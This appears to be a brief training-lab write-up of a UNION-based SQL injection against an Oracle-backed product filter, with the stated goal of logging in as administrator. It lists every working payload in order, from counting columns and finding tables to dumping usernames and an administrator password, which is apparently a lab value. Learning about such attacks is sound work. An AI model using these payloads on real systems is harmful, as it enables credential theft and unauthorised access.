

## End goal: login as administrator


## Burp
GET /filter?category=Pets HTTP/1.1

## Finding the number of column
`' union select null ,null  from dual--`
number of column = 2

## finding the datatype of column

`' union select 'a' , 'a'  from dual--`

both columns are of string data type

## outputing table_name form all_tables

`' union select table_name , 'a'  from all_tables--`

we found table : USERS_XODSEE


## outputing column name from USERS_XODSEE

` ' union SELECT column_name , null FROM all_tab_columns WHERE table_name = 'USERS_XODSEE'  -- `


we found column 
PASSWORD_ZJPZZC
USERNAME_IOZCXO

## outputing the username and password

` 'union select USERNAME_IOZCXO, PASSWORD_ZJPZZC from USERS_XODSEE --`


administrator
icgkweid7wok7r0wx55s
